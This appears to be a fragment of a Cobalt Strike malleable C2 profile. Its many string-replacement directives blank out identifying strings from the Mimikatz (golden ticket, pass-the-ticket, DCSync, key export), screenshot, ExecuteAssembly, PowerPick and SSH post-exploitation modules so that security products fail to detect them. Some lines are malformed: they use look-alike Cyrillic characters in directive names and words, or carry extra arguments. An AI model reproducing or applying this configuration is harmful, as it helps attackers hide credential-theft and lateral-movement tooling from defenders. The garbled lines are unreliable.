   strrepex "Mimikatz" "-- data):" "";
   strrepex "Mimikatz" "ERROR kuhl_m_crypto_exportKeyToFile ; kull_m_string_EncodeB64_headers (" "";
   strrepex "Mimikatz" "PRIVATE KEY" "";
   strrepex "Mimikatz" "Algorithm Group" "";
   strrepex "Mimikatz" "ERROR kuhl_m_crypto_exportKeyToFile ; CryptExportKey(init) (0x" "";
   strrepex "Mimikatz" "ERROR kuhl_m_crypto_exportKeyToFile ; CryptExportKey(data) (0x" "";
   strrepex "Mimikatz" "Private export :" ""; 
   strrepex "Mimikatz" "ERROR kuhl_m_crypto_exportRawKeyToFile ; kull_m_file_writeData (0x" "";
   strrepex "Mimikatz" "KO -" "";
   strrepex "Mimikatz" "OK -" "";
   strrepex "Mimikatz" "Private raw export :" "";
   strrepex "Mimikatz" "ERROR kuhl_m_crypto_exportRawKeyToFile ; CryptImportKey (0x" "";
   strrepex "Mimikatz" "Key permissions:" "";
   strrepex "Mimikatz" "|Unique name :" "";
   strrepex "Mimikatz" "|Key Container :" "";
   strrepex "Mimikatz" "|Provider name :" "";
   strrepex "Mimikatz" "LSA isolation :" "";
   strrepex "Mimikatz" "Exportable key :" "";
   strrepex "Mimikatz" "Export policy :" "";
   strrepex "Mimikatz" "Key size :" "";
   strrepex "Mimikatz" "Algorithm :" "";
   strrepex "Mimikatz" "Algorithm Name" "";
   strrepex "Mimikatz" "Unique Name" "";
   strrepex "Mimikatz" "Key Container :" "";
   strrepex "Mimikatz" "|Implementation:" "";
   strrepex "Mimikatz" "Impl Type" "";
   strrepex "Mimikatz" "|Provider name :" "";
   strrepex "Mimikatz" "Provider Handle" "";
   strrepex "Mimikatz" "(null)" "";
   strrepex "Mimikatz" "[!%hu!]" "";
   strrepex "Mimikatz" "[BOOL ]" "";
   strrepex "Mimikatz" "[STRING]" "";
   strrepex "Mimikatz" "[UINT64]" "";
   strrepex "Mimikatz" "[INT64 ]" "";
   strrepex "Mimikatz" "Id:" "";
   strrepex "Mimikatz" "* PAC signed" "";
   strrepex "Mimikatz" "* PAC generated" "";
   strrepex "Mimikatz" "ERROR PAC kuhl_m_kerberos_golden ; Missing user argument" "";
   strrepex "Mimikatz" "ERROR kuhl_m_kerberos_golden ; Missing domain argument" "";
   strrepex "Mimikatz" "ERROR kuhl_m_kerberos_golden ; Domain name does not look like a FQDN" "";
   strrepex "Mimikatz" "ERROR kuhl_m_kerberos_golden ; Missing krbtgt key argument (/rc4 or /aes128 or /aes256)" "";
   strrepex "Mimikatz" "ERROR kuhl_m_kerberos_golden ; Unable to locate CryptoSystem for ETYPE %u (error 0x%08x) - AES only available on NT6" "";
   strrepex "Mimikatz" "ERROR kuhl_m_kerberos_golden ; Krbtgt key size length must be " "";
   strrepex "Mimikatz" " bytes) for" "";
   strrepex "Mimikatz" "ERROR kuhl_m_kerberos_golden ; BerApp_KrbCred error" "";
   strrepex "Mimikatz" "kull_m_file_writeData ("golden";" "";
   strrepex "Mimikatz" "Final Ticket Saved to file !" "";
   strrepex "Mimikatz" "successfully submitted for current session" "";
   strrepex "Mimikatz" "Golden Ticket ticket for" "";
   strrepex "Mimikatz" "→ Ticket :" "";
   strrepex "Mimikatz" "** Pass The Ticket **" "";
   strrepex "Mimikatz" "Lifetime :" "";
   strrepex "Mimikatz" "Target :" "";
   strrepex "Mimikatz" "Service :" "";
   strrepex "Mimikatz" "ServiceKey :" "";
   strrepex "Mimikatz" "Claims :" "";
   strrepex "Mimikatz" "Extra SIDs:" "";
   strrepex "Mimikatz" "Groups Id : *" "";
   strrepex "Mimikatz" "Session Id :" "";
   strrepex "Mimikatz" "User Id :" "";
   strrepex "Mimikatz" "SID :" "";
   strrepex "Mimikatz" "Domain :" "";
   strrepex "Mimikatz" "User :" "";
   strrepex "Mimikatz" "ERROR kuhl_m_kerberos_ptt_data ; LsaCallAuthenticationPackage KerbSubmitTicketMessage : %" "";
   strrepex "Mimikatz" "ERROR kuhl_m_kerberos_ptt_data ; LsaCallAuthenticationPackage KerbSubmitTicketMessage / Package :" "";
   strrepex "Mimikatz" "Kerberos package module" "";
   strrepex "Mimikatz" "List tickets in NT6/Heimdall cache" "";
   strrepex "Mimikatz" "Pass-the-ticket [NT6]" "";
   strrepex "Mimikatz" "Hash password to keys" "";
   strrepex "Mimikatz" "Willy Wonka factory" "";
   strrepex "Mimikatz" "Purge ticket(s)" "";
   strrepex "Mimikatz" "Retrieve current TGT" "";
   strrepex "Mimikatz" "Ask or get TGS tickets" "";
   strrepex "Mimikatz" "List ticket(s)" "";
   strrepex "Mimikatz" "Pass-the-ticket [NT 6]" "";
   strrepex "Mimikatz" "Virtual Iso" "";
   strrepex "Mimikatz" "ERROR kuhl_m_dpapi_oe_domainkey_add ; No GUID or Key?" "";
   strrepex "Mimikatz" "ERROR kuhl_m_dpapi_oe_credential_add ; No SID?" "";
   strrepex "Mimikatz" "[DC] " "";
   strrepex "Mimikatz" "will be the DC server" "";
   strrepex "Mimikatz" "will be the domain server" "";
   strrepex "Mimikatz" "Description :" "";
   strrepex "Mimikatz" "Full name :" "";
   strrepex "Mimikatz" "Module :" "";
   strrepex "Mimikatz" "ERROR mimikatz_doLocal ;" "";
   strrepex "Mimikatz" "command not found !" "";
   strrepex "Mimikatz" "module not loaded !" "";
   strrepex "Mimikatz" "ERROR mimikatz_doLocal ;" "";
   strrepex "Mimikatz" ">>>" "";
   strrepex "Mimikatz" "module failed :" "";
   strrepex "Mimikatz" "ERROR mimikatz_initOrClean ; CoInitializeEx:" "";
   strrepex "Mimikatz" "mimikatz 2.2.0-20220919 (x64) #19041 Mar 27 2024 11:34:27" "";
   strrepex "Mimikatz" " .## ^ ##. 'A La Vie, A L'Amour' - (oe.eo)" "";
   strrepex "Mimikatz" " ## / \\ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )" "";
   strrepex "Mimikatz" " ## \\ / ## > https://blog.gentilkiwi.com/mimikatz" "";
   strrepex "Mimikatz" " '# ## v ##' > Vincent LE TOUX ( vincent.letoux@gmail.com )" "";
   strrepex "Mimikatz" " 'mimikatz(powershell) # pingcastle.com / https://mysmartlogon.com ***/" "";
   strrepex "Mimikatz" "token::elevate" "";
   strrepex "Mimikatz" "ERROR kull_m_string_displaySID ; ConvertSidToStringSid (" "";
   strrepex "Mimikatz" "ERROR kull_m_rpc_drsr_findAttrType ; Unable to get an ATTRTYP for" "";
   strrepex "Mimikatz" "ERROR kull_m_rpc_drsr_MakeAddPrefixToTable" "";
   strrepex "Mimikatz" "ERROR kull_m_rpc_drsr_free_DRS_MSG ; kull_m_rpc_drsr_free_DRS_MSG_GETCHGREPLY_data ; dwOutVersion not valid" "";
   strrepex "Mimikatz" "ERROR kull_m_rpc_drsr_free_DRS_MSG_DCINFOREPLY_data ; TODO (maybe?)" "";
   strrepex "Mimikatz" "ERROR kull_m_rpc_drsr_free_DRS_MSG_DCINFOREPLY_data ; dwOutVersion not valid (" "";
   strrepex "Mimikatz" "ERROR kull_m_rpc_drsr_free_DRS_MSG_DCINFOFOREPLY_data ; TODO (maybe?)" "";
   strrepex "Mimikatz" "ERROR kull_m_rpc_drsr_free_DRS_MSG_GETCHGREPLY_data ; No Session Key" "";
   strrepex "Mimikatz" "ERROR kull_m_rpc_drsr_CreateGetNCChangesReply_encrypt ; No valid data" "";
   strrepex "Mimikatz" "ERROR kull_m_rpc_drsr_CreateGetNCChangesReply_encrypt ; Unable to calculate CRC32" "";
   strrepex "Mimikatz" "ERROR kull_m_rpc_drsr_ProcessGetNCChangesReply_decrypt ; No Session Key" "";
   strrepex "Mimikatz" "ERROR kull_m_rpc_drsr_ProcessGetNCChangesReply_decrypt ; RtlDecryptData2" "";
   strrepex "Mimikatz" "ERROR kull_m_rpc_drsr_ProcessGetNCChangesReply_decrypt ; No valid data" "";
   strrepex "Mimikatz" "ERROR kull_m_rpc_drsr_ProcessGetNCChangesReply_decrypt ; RtlDecryptData2" "";
   strrepex "Mimikatz" "ERROR kull_m_rpc_drsr_ProcessGetNCChangesReply_decrypt ; Unable to calculate CRC32" "";
   strrepex "Mimikatz" "ERROR kull_m_rpc_drsr_ProcessGetNCChangesReply_decrypt ; Checksums don't match (C:" "";
   strrepex "Mimikatz" " - R:" "";
   strrepex "Mimikatz" "ERROR kull_m_rpc_drsr_ProcessGetNCChangesReply ; Unable to MakeAttid for" "";
   strrepex "Mimikatz" "ERROR kull_m_rpc_drsr_CrackName ; RPC Exception 0x" "";
   strrepex "Mimikatz" "ERROR kull_m_rpc_drsr_CrackName ; CrackNames:" "";
   strrepex "Mimikatz" "ERROR kull_m_rpc_drsr_CrackName ; CrackNames: bad version" "";
   strrepex "Mimikatz" "ERROR kull_m_rpc_drsr_CrackName ; CrackNames: no item!" "";
   strrepex "Mimikatz" "ERROR kull_m_rpc_drsr_CrackName ; CrackNames (name status): 0x" "";
   strrepex "Mimikatz" "ERROR kull_m_rpc_drsr_getDCBind ; RPC Exception 0x" "";
   strrepex "Mimikatz" "ERROR kull_m_rpc_drsr_getDCBind ; IDL_DRSBind:" "";
   strrepex "Mimikatz" "ERROR kull_m_rpc_drsr_getDCBind ; No DRS Extensions Output" "";
   strrepex "Mimikatz" "ERROR kull_m_rpc_drsr_getDCBind ; Incorrect DRS Extensions Output Size (" "";
   strrepex "Mimikatz" "ERROR kull_m_rpc_drsr_getDCBind ; Incorrect DRS Extensions Output (" "";
   strrepex "Mimikatz" "ERROR kull_m_rpc_drsr_getDomainAndUserInfos ; RPC Exception 0x" "";
   strrepex "Mimikatz" "ERROR kull_m_rpc_drsr_getDomainAndUserInfos ; DomainControllerInfo: 0x" "";
   strrepex "Mimikatz" "ERROR kull_m_rpc_drsr_getDomainAndUserInfos ; DomainControllerInfo: bad version (" "";
   strrepex "Mimikatz" "ERROR kull_m_rpc_drsr_getDomainAndUserInfos ; DomainControllerInfo: DC" "";
   strrepex "Mimikatz" "not found" "";
   strrepex "Mimikatz" "ERROR kull_m_rpc_drsr_RpcSecurityCallback ; I_RpcBindingInqSecurityContext" "";
   strrepex "Mimikatz" "ERROR kull_m_rpc_drsr_RpcSecurityCallback ; QueryContextAttributes" "";
   strrepex "Mimikatz" "ERROR kull_m_rpc_Generic_Encode ; MesEncodeIncrementalHandleCreate:" "";
   strrepex "Mimikatz" "ERROR kull_m_rpc_Generic_Encode ; MesIncrementalHandleReset:" "";
   strrepex "Mimikatz" "ERROR kull_m_rpc_Generic_Encode ; RPC Exception: 0x" "";
   strrepex "Mimikatz" "ERROR kull_m_rpc_Generic_Free ; MesDecodeIncrementalHandleCreate:" "";
   strrepex "Mimikatz" "ERROR kull_m_rpc_Generic_Decode ; MesIncrementalHandleReset:" "";
   strrepex "Mimikatz" "ERROR kull_m_rpc_Generic_Decode ; RPC Exception: 0x" "";
   strrepex "Mimikatz" "[rpc] Password :" "rpc pwd";
   strrepex "Mimikatz" "[rpc] Domain :" "";
   strrepex "Mimikatz" "[rpc] Username :" "";
   strrepex "Mimikatz" "[rpc] AuthnSvc :" "";
   strrepex "Mimikatz" "[rpc] Service :" "";
   strrepex "Mimikatz" "ERROR kull_m_rpc_createBinding ; RpcStringBindingCompose: 0x" "";
   strrepex "Mimikatz" "ERROR kull_m_rpc_createBinding ; RpcBindingFromStringBinding: 0x" "";
   strrepex "Mimikatz" "ERROR kull_m_rpc_createBinding ; No Binding!" "";
   strrepex "Mimikatz" "ERROR kull_m_rpc_createBinding ; RpcBindingFree: 0x" "";
   strrepex "Mimikatz" "ERROR kull_m_rpc_createBinding ; RpcBindingSetAuthInfoEx: 0x" "";
   strrepex "Mimikatz" "Cannot add Service to NetworkAddr if NULL" "";
   strrepex "Mimikatz" "Active mode" "";
   strrepex "Mimikatz" "Erreur LocalAlloc:" "";
   strrepex "Mimikatz" "ERROR kull_m_net_getDC ; DsGetDcName:" "";
   strrepex "Mimikatz" "ERROR kull_m_ldap_getRootDomainNamingContext ; ldap_search_s 0x" "";
   strrepex "Mimikatz" "ERROR kull_m_ldap_getRootDomainNamingContext ; ldap_count_entries is NOT 1" "";
   strrepex "Mimikatz" "ERROR kull_m_ldap_getRootDomainNamingContext ; ldap_get_values_len is NOT 1" "";
   strrepex "Mimikatz" "ERROR kull_m_ldap_getLdapAndRootDN ; ldap_init" "";
   strrepex "Mimikatz" "ERROR kull_m_ldap_getLdapAndRootDN ; ldap_init" "";
   strrepex "Mimikatz" "ERROR kull_m_ldap_getLdapAndRootDN ; ldap_bind_s 0x" "";
   strrepex "Mimikatz" "ERROR kull_m_kernel_ioctl_handle ; DeviceIoControl (0x" "";
   strrepex "Mimikatz" "Base64 of file :" "";
   strrepex "Mimikatz" "ERROR SkpEncryptionWorker ; Skp Crypto without CNG?" "";
   strrepex "Mimikatz" "ERROR SkpEncryptionWorker ; SkpInitSymmetricEncryption: 0x" "";
   strrepex "Mimikatz" "ERROR SkpEncryptionWorker ; SkpDeriveSymmetricKey: 0x" "";
   strrepex "Mimikatz" "ERROR SkpEncryptionWorker ; BCryptGenerateSymmetricKey: 0x" "";
   strrepex "Mimikatz" "ERROR SkpInitSymmetricEncryption ; SkpOpenAesGcmProvider: 0x" "";
   strrepex "Mimikatz" "ERROR SkpInitSymmetricEncryption ; SkpOpenKdfProvider: 0x" "";
   strrepex "Mimikatz" "ERROR SkpInitSymmetricEncryption ; SkpImportMasterKeyInKdf: 0x" "";
   strrepex "Mimikatz" "ERROR SkpOpenKdfProvider ; BCryptOpenAlgorithmProvider: 0x" "";
   strrepex "Mimikatz" "ERROR SkpOpenKdfProvider ; BCryptGetProperty: 0x" "";
   strrepex "Mimikatz" "ERROR SkpOpenAesGcmProvider ; BCryptSetProperty: 0x" "";
   strrepex "Mimikatz" "ERROR kull_m_crypto_NCryptFreeHandle ; NCryptFreeObject(prov): 0x" "";
   strrepex "Mimikatz" "ERROR kull_m_crypto_NCryptFreeHandle ; No NCrypt support this function" "";
   strrepex "Mimikatz" "ERROR kull_m_crypto_NCryptFreeHandle ; NCryptFreeObject(key): 0x" "";
   strrepex "Mimikatz" "ERROR kull_m_crypto_NCryptGetProperty ; NCryptGetProperty(%s) - init: 0x" "";
   strrepex "Mimikatz" "ERROR kull_m_crypto_NCryptGetProperty ; NCryptGetProperty(%s) - data: 0x" "";
   strrepex "Mimikatz" "ERROR kull_m_crypto_NCryptGetProperty ; NCryptGetProperty(%s) - simple NCrypt_HANDLE: 0x" "";
   strrepex "Mimikatz" "ERROR kull_m_crypto_NCryptAndKeyInfoToPfx ; CertAddEncodedCertificateToStore(DWORD): 0x" "";
   strrepex "Mimikatz" "ERROR kull_m_crypto_DerAndKeyInfoToPfx ; CertSetCertificateContextProperty(CERT_KEY_PROV_INFO_PROP_ID) (0x" "";
   strrepex "Mimikatz" "ERROR kull_m_crypto_DerAndKeyToPfx ; CryptAcquireContext (0x" "";
   strrepex "Mimikatz" "ERROR kull_m_crypto_DerAndKeyToPfx ; CryptImportKey (0x" "";
   strrepex "Mimikatz" "ERROR kull_m_crypto_exportPfx ; PFXExportCertStoreEx/kull_m_file_writeData (0x" "";
   strrepex "Mimikatz" "ERROR kull_m_asn1_init_close ; ASN1prov->delete_container" "";
   strrepex "Mimikatz" "ERROR kull_m_asn1_init ; ASN1_CreateDecoder:" "";
   strrepex "Mimikatz" "ERROR kull_m_asn1_init ; ASN1_CreateEncoder:" "";
   strrepex "Mimikatz" "ERROR kull_m_asn1_init ; ASN1_CreateModule" "";
   strrepex "Mimikatz" "ERROR kull_m_asn1_init ; ASN1_CreateDecoder:" "";
   strrepex "Mimikatz" "ERROR kull_m_asn1_init ; ASN1_CreateEncoder:" "";

   strrepex "Screenshot" "Quantization table 0x" "";
   strrepex "Screenshot" "Not a JPEG file: starts with" "";
   strrepex "Screenshot" "Insufficient memory (case" "";
   strrepex "Screenshot" "Cannot quantize more than" "";
   strrepex "Screenshot" "color components" "";
   strrepex "Screenshot" "Cannot quantize to fewer than" "";
   strrepex "Screenshot" "Cannot quantize to more than" "";
   strrepex "Screenshot" "Invalid JPEG file structure: two SOF markers" "";
   strrepex "Screenshot" "Invalid JPEG file structure: missing SOS marker" "";
   strrepex "Screenshot" "Unsupported JPEG process: SOF type 0x" "";
   strrepex "Screenshot" "Invalid JPEG file structure: two SOI markers" "";
   strrepex "Screenshot" "Invalid JPEG file structure: SOS before SOF" "";
   strrepex "Screenshot" "Failed to create temporary file" "";
   strrepex "Screenshot" "Read failed on temporary file" "";
   strrepex "Screenshot" "Seek failed on temporary file" "";
   strrepex "Screenshot" "Write failed on temporary file — out of disk space?" "";
   strrepex "Screenshot" "Unsupported marker type 0x" "";
   strrepex "Screenshot" "Virtual array controller messed up" "";
   strrepex "Screenshot" "Image too wide for this implementation" "";
   strrepex "Screenshot" "Read from XMS failed" "";
   strrepex "Screenshot" "Write to XMS failed" "";
   strrepex "Screenshot" "Copyright (C) 2010, Thomas G. Lane, Guido Vollbeding" "";
   strrepex "Screenshot" "10-Jan-2010" "";
   strrepex "Screenshot" "Caution: quantization tables are too coarse for baseline JPEG" "";
   strrepex "Screenshot" "Adobe APP14 marker: version %d, flags 0x" "";
   strrepex "Screenshot" ", transform" "";
   strrepex "Screenshot" "Unknown APP0 marker (not JFIF), length" "";
   strrepex "Screenshot" "Unknown APP14 marker (not Adobe), length" "";
   strrepex "Screenshot" "Define quantization table" "";
   strrepex "Screenshot" "precision" "";
   strrepex "Screenshot" "Define Restart Interval" "";
   strrepex "Screenshot" "Freed EMS handle" "";
   strrepex "Screenshot" "Obtained EMS handle" "";
   strrepex "Screenshot" "End Of Image" "";
   strrepex "Screenshot" "JFIF APP0 marker: version" "";
   strrepex "Screenshot" "density" "";
   strrepex "Screenshot" "Warning: thumbnail image size does not match data length" "";
   strrepex "Screenshot" "JFIF extension image marker: type 0x" "";
   strrepex "Screenshot" "thumbnail image" "";
   strrepex "Screenshot" "Miscellaneous marker" "";
   strrepex "Screenshot" "Unexpected marker" "";
   strrepex "Screenshot" "Quantizing to" "";
   strrepex "Screenshot" "Selected" "";
   strrepex "Screenshot" "colors for quantization" "";
   strrepex "Screenshot" "At marker" "";
   strrepex "Screenshot" ", recovery action" "";
   strrepex "Screenshot" "Invalid SOS parameters for sequential JPEG" "";
   strrepex "Screenshot" "Smoothing not supported with nonstandard sampling ratios" "";
   strrepex "Screenshot" "width=" "";
   strrepex "Screenshot" ", height=" "";
   strrepex "Screenshot" "components=" "";
   strrepex "Screenshot" "Component " "";
   strrepex "Screenshot" "q=" "";
   strrepex "Screenshot" "Start of Image" "";
   strrepex "Screenshot" "Start Of Scan:" "";
   strrepex "Screenshot" "components" "";
   strrepex "Screenshot" "dc=" "";
   strrepex "Screenshot" "ac=" "";
   strrepex "Screenshot" "Ss=" "";
   strrepex "Screenshot" "Se=" "";
   strrepex "Screenshot" "Ah=" "";
   strrepex "Screenshot" "Al=" "";
   strrepex "Screenshot" "Closed temporary file" "";
   strrepex "Screenshot" "Opened temporary file" "";
   strrepex "Screenshot" "JFIF extension marker: JPEG-compressed thumbnail image, length" "";
   strrepex "Screenshot" "JFIF extension marker: palette thumbnail image, length" "";
   strrepex "Screenshot" "JFIF unrecognized component marker: RGB thumbnail image, length" "";
   strrepex "Screenshot" ", assuming YCbCr" "";
   strrepex "Screenshot" "Freed XMS handle" "";
   strrepex "Screenshot" "Obtained XMS handle" "";
   strrepex "Screenshot" "Unknown Adobe color transform code" "";
   strrepex "Screenshot" "Corrupt JPEG data: bad arithmetic code" "";
   strrepex "Screenshot" "Inconsistent progression sequence for component" "";
   strrepex "Screenshot" "Corrupt JPEG data:" "";
   strrepex "Screenshot" "extraneous bytes before marker 0x" "";
   strrepex "Screenshot" "Corrupt JPEG data: premature end of data segment" "";
   strrepex "Screenshot" "Corrupt JPEG data: bad Huffman code" "";
   strrepex "Screenshot" "Warning: unknown end of JFIF revision number" "";
   strrepex "Screenshot" "Premature end of JPEG file" "";
   strrepex "Screenshot" "Corrupt JPEG data: found marker" "";
   strrepex "Screenshot" "instead of RST" "";
   strrepex "Screenshot" "Invalid SOS parameters for sequential JPEG" "";
   strrepex "Screenshot" "Bogus application transferred too many scanlines" "";
   strrepex "Screenshot" "Bogus message code" "";
   strrepex "Screenshot" "ALIGN_TYPE is wrong, please fix" "";
   strrepex "Screenshot" "MAX_ALLOC_CHUNK is wrong, please fix" "";
   strrepex "Screenshot" "Bogus buffer control mode" "";
   strrepex "Screenshot" "Invalid component ID" "";
   strrеpex "Screenshot" "Bogus buffer control mode" "";
   strrеpex "Screenshot" "Invalid component ID" "";
   strrеpex "Screenshot" "in SOS" "";
   strrеpex "Screenshot" "Invalid crop request" "";
   strrеpex "Screenshot" "DCT coefficient out of range" "";
   strrеpex "Screenshot" "DCT scaled block size" "range" "";
   strrеpex "Screenshot" "not supported" "";
   strrеpex "Screenshot" "Component index" "";
   strrеpex "Screenshot" "mismatching Huffman sampling ratio" "";
   strrеpex "Screenshot" "Bogus Huffman table definition" "";
   strrеpex "Screenshot" "Bogus input colorsрace" "";
   strrеpex "Screenshot" "Bogus JPEG colorsрace" "";
   strrеpex "Screenshot" "Bogus JPEG marker length" "";
   strrеpex "Screenshot" "Wrong JPEG library version: library is" "";
   strrеpex "Screenshot" "caller expects" "";
   strrеpex "Screenshot" "Sampling factors too large for interleaved scan" "";
   strrеpex "Screenshot" "Invalid memory JPEG pool code" "";
   strrеpex "Screenshot" "Unsupported precision" "";
   strrеpex "Screenshot" "Invalid progressive JPEG parameters" "";
   strrеpex "Screenshot" "Invalid progressive parameters at scan script entry" "";
   strrеpex "Screenshot" "Bogus sampling factors" "";
   strrеpex "Screenshot" "Invalid scan script at entry" "";
   strrеpex "Screenshot" "Improper call to JPEG library in state" "";
   strrеpex "Screenshot" "JPEG parameter struct mismatch: library thinks size is" "";
   strrеpex "Screenshot" ", caller expects" "";
   strrеpex "Screenshot" "Bogus caller virtual expects array access" "";
   strrеpex "Screenshot" "Buffer passed to JPEG library is too small" "";
   strrеpex "Screenshot" "Suspension not allowed here" "";
   strrеpex "Screenshot" "CCIR601 sampling not implemented yet" "";
   strrеpex "Screenshot" "Too many" "";
   strrеpex "Screenshot" "color components" ": " "";
   strrеpex "Screenshot" ", max" "";
   strrеpex "Screenshot" "Unsupported color conversion request" "";
   strrepex "Screenshot" "Bogus DAC index" "";
   strrepex "Screenshot" "Bogus DAC value value" "";
   strrepex "Screenshot" "Bogus DHT index" "";
   strrepex "Screenshot" "Bogus DQT index" "";
   strrepex "Screenshot" "Empty JPEG image (DNL not supported)" "";
   strrepex "Screenshot" "Read from EMS failed" "";
   strrepex "Screenshot" "Write to EMS failed" "";
   strrepex "Screenshot" "Didn't expect more than one scan" "";
   strrepex "Screenshot" "Input file read error" "";
   strrepex "Screenshot" "Output file write error — out of disk space?" "";
   strrepex "Screenshot" "Fractional code sampling not implemented yet" "";
   strrepex "Screenshot" "Huffman size table overflow" "";
   strrepex "Screenshot" "Missing Huffman code table entry" "";
   strrepex "Screenshot" "Maximum supported image dimension is" "";
   strrepex "Screenshot" " pixels" "";
   strrepex "Screenshot" "Empty input file" "";
   strrepex "Screenshot" "Premature end of input file" "";
   strrepex "Screenshot" "Cannot transcode due to multiple use of quantization table" "";
   strrepex "Screenshot" "Scan script does not transmit all data" "";
   strrepex "Screenshot" "Invalid color quantization mode change" "";
   strrepex "Screenshot" "Not implemented yet" "";
   strrepex "Screenshot" "Requested feature was omitted at compile time" "";
   strrepex "Screenshot" "Arithmetic table 0x" "";
   strrepex "Screenshot" "was not defined" "";
   strrepex "Screenshot" "Backing store not supported" "";
   strrepex "Screenshot" "Huffman" "";
   strrepex "Screenshot" "JPEG datastream contains no image" "";
   strrepex "Screenshot" "ExecuteAssembly" "ICLRMetaHost::GetRuntime" "";
   
   strrepex "ExecuteAssembly" "failed w/hr 0x" "";
   strrepex "ExecuteAssembly" ".NET runtime [ver" "";
   strrepex "ExecuteAssembly" "] cannot be loaded" "";
   strrepex "ExecuteAssembly" "[-] No .NET runtime found. :(" "";
   strrepex "ExecuteAssembly" "[-] getEntryPoint failed." "";
   strrepex "ExecuteAssembly" "[+] getEntryPoint failed." "";
   strrepex "ExecuteAssembly" "[-] Invoke_3 on EntryPoint failed." "";
   strrepex "ExecuteAssembly" "[-] Failed to create the runtime host" "";
   strrepex "ExecuteAssembly" "[-] ICorRuntimeHost::GetDefaultDomain failed w/hr 0x" "";
   strrepex "ExecuteAssembly" "[-] Failed to get default AppDomain w/hr 0x" "";
   strrepex "ExecuteAssembly" "Could not find signature in the" "";
   strrepex "ExecuteAssembly" "Could not fix signature in the" "";
   strrepex "ExecuteAssembly" "function :" "";
   strrepex "ExecuteAssembly" "[-] Patch index" "";
   strrepex "ExecuteAssembly" " error setting memory protection" "";
   strrepex "ExecuteAssembly" "loading" "";
   strrepex "ExecuteAssembly" "getting library address for:" "";
   strrepex "ExecuteAssembly" "getting proc address for:" "";
   strrepex "ExecuteAssembly" "error re-setting memory protection" "";
   strrepex "ExecuteAssembly" "bad exception" "";
   
   strrepex "PowerPick" "Could not find signature in the" "";
   strrepex "PowerPick" "Could not fix signature in the" "";
   strrepex "PowerPick" "function:" "";
   strrepex "PowerPick" "[-] Patch index" "";
   strrepex "PowerPick" " error setting memory protection" "";
   strrepex "PowerPick" "error re-setting memory protection" "";
   strrepex "PowerPick" "loading library" "";
   strrepex "PowerPick" "getting proc address:" "";
   strrepex "PowerPick" "Could not find .NET 4.0 API CLRCreateInstance" "";
   strrepex "PowerPick" "CLRCreateInstance failed w/hr 0x" "";
   strrepex "PowerPick" "ICLRMetaHost::GetRuntime (v4.0.30319) failed w/hr 0x" "";
   strrepex "PowerPick" ".NET runtime [ver" "";
   strrepex "PowerPick" "] cannot be loaded" "";
   strrepex "PowerPick" "ICLRRuntimeInfo::GetInterface failed w/hr 0x" "";
   strrepex "PowerPick" "Could not find API CorBindToRuntime" "";
   strrepex "PowerPick" "CorBindToRuntime failed w/hr 0x" "";
   strrepex "PowerPick" "Did not understand ver:" "";
   strrepex "PowerPick" "Failed to invoke IsAlive w/hr 0x" "";
   strrepex "PowerPick" "SafeArrayPutElement failed w/hr 0x" "";
   strrepex "PowerPick" "Failed to invoke InvokePS w/hr 0x" "";
   strrepex "PowerPick" "Failed to create the runtime host" "";
   strrepex "PowerPick" "CLR failed to start w/hr 0x" "";
   strrepex "PowerPick" "RuntimeClrHost::GetCurrentAppDomainId failed w/hr 0x" "";
   strrepex "PowerPick" "ICorRuntimeHost::GetDefaultDomain failed w/hr 0x" "";
   strrepex "PowerPick" "Failed to get default AppDomain w/hr 0x" "";
   strrepex "PowerPick" "Failed to load the assembly w/hr 0x" "";
   strrepex "PowerPick" "Failed to get the Type interface w/hr 0x" "";
   strrepex "PowerPick" "bad allocation" "";

   strrepex "SSHAgent" "Error allocating space for remote banner" "";
   strrepex "SSHAgent" "Error allocating space for remote banner" "";
   strrepex "SSHAgent" "Received Banner:" "";
   strrepex "SSHAgent" "SSH-2.0-libssh2_1.8.0" "";
   strrepex "SSHAgent" " bytes at" "";
   strrepex "SSHAgent" "Unable to allocate memory for local banner" "";
   strrepex "SSHAgent" "Setting to local Banner:" "";
   strrepex "SSHAgent" "API timeout expired" "";
   strrepex "SSHAgent" "Timed out waiting on socket" "";
   strrepex "SSHAgent" "Error waiting on socket" "";
   strrepex "SSHAgent" "Bad socket provided" "";
   strrepex "SSHAgent" "Failed changing socket's blocking state to non-blocking" "";
   strrepex "SSHAgent" "Failed sending banner" "";
   strrepex "SSHAgent" "Failed getting banner" "";
   strrepex "SSHAgent" "Unable to exchange encryption keys" "";
   strrepex "SSHAgent" "Unable to ask for ssh-userauth service" "";
   strrepex "SSHAgent" "Invalid response received from server" "";
   strrepex "SSHAgent" "Freeing session resource" "";
   strrepex "SSHAgent" "Disconnecting: reason=" "";
   strrepex "SSHAgent" "desc=" "";
   strrepex "SSHAgent" ", lang=" "";
   strrepex "SSHAgent" "too long description" "";
   strrepex "SSHAgent" "OFF" "";
   strrepex "SSHAgent" "Setting blocking mode" "";
   strrepex "SSHAgent" "Unable to allocate space for channel data" "";
   strrepex "SSHAgent" "Failed allocating space for channel type name" "";
   strrepex "SSHAgent" "Unable to allocate temporary space for packet" "";
   strrepex "SSHAgent" "Would block sending channel-open request" "";
   strrepex "SSHAgent" "Unable to send channel-open request" "";
   strrepex "SSHAgent" "Would block" "";
   strrepex "SSHAgent" "Channel open failure (administratively prohibited)" "";
   strrepex "SSHAgent" "Channel open failure (connect failed)" "";
   strrepex "SSHAgent" "Channel open failure (unknown channel type)" "";
   strrepex "SSHAgent" "Channel open failure (resource shortage)" "";
   strrepex "SSHAgent" "Channel open failure" "";
   strrepex "SSHAgent" "Requesting direct-tcpip session to from" "";
   strrepex "SSHAgent" "Unable to allocate memory for direct-tcpip connection" "";
   strrepex "SSHAgent" "Would block sending global-request packet for forward listen request" "";
   strrepex "SSHAgent" "Requesting tcpip-forward session for" "";
   strrepex "SSHAgent" "Unable to allocate memory for setenv packet" "";
   strrepex "SSHAgent" "Unable to send global-request packet for forward listen request" "";
   strrepex "SSHAgent" "Unable to allocate complete memory for listener queue" "";
   strrepex "SSHAgent" "Unable to forward-listen" "";
   strrepex "SSHAgent" "Cancelling complete tcpip-forward request session for forward for" "";
   strrepex "SSHAgent" "Would block sending forward request" "";
   strrepex "SSHAgent" "Would block waiting for packet" "";
   strrepex "SSHAgent" "Channel not found" "";
   strrepex "SSHAgent" "Channel can not be reused" "";
   strrepex "SSHAgent" "starting request" "";
   strrepex "SSHAgent" "on channel" "";
   strrepex "SSHAgent" ", message=" "";
   strrepex "SSHAgent" "Unable to allocate memory for channel-process request" "";
   strrepex "SSHAgent" "Would block sending channel request" "";
   strrepex "SSHAgent" "Unable to send channel request" "";
